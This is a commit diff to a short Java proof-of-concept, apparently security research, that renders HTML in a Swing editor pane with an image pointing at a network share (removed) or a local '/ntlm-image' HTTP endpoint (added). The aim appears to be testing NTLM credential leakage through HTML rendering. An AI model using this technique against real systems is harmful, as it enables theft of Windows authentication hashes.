cfd344c1f250d1102d5fc5495c81689f7d0b5779
sealldeveloper-aidr2 <umgdl71fvon28qmf--githubaidr2-1785896221@oob.blackmail.zip>
2026-08-17 04:45:59 +0000

    test HTTP NTLM rendering

--- SwingWindowsProof.java
+++ SwingWindowsProof.java
@@ -1,9 +1,8 @@
 import javax.swing.*;
 public class SwingWindowsProof {
  public static void main(String[] args) throws Exception {
-   String host=System.getenv("COMPUTERNAME");
-   System.out.println("os="+System.getProperty("os.name")+" host="+host+" java="+System.getProperty("java.version")+" headless="+java.awt.GraphicsEnvironment.isHeadless());
-   String html="<html><body><img src='jar:file://"+host+"/SHARE/nonexistent.jar!/x.png'></body></html>";
+   System.out.println("os="+System.getProperty("os.name")+" host="+System.getenv("COMPUTERNAME")+" java="+System.getProperty("java.version")+" headless="+java.awt.GraphicsEnvironment.isHeadless());
+   String html="<html><body><img src='http://localhost:18087/ntlm-image'></body></html>";
    SwingUtilities.invokeAndWait(() -> { JEditorPane pane=new JEditorPane("text/html",html); JFrame frame=new JFrame("proof"); frame.add(pane); frame.setSize(500,500); frame.setVisible(true); System.out.println("Rendered frame: "+html); });
    Thread.sleep(25000); System.out.println("done"); System.exit(0);
  }
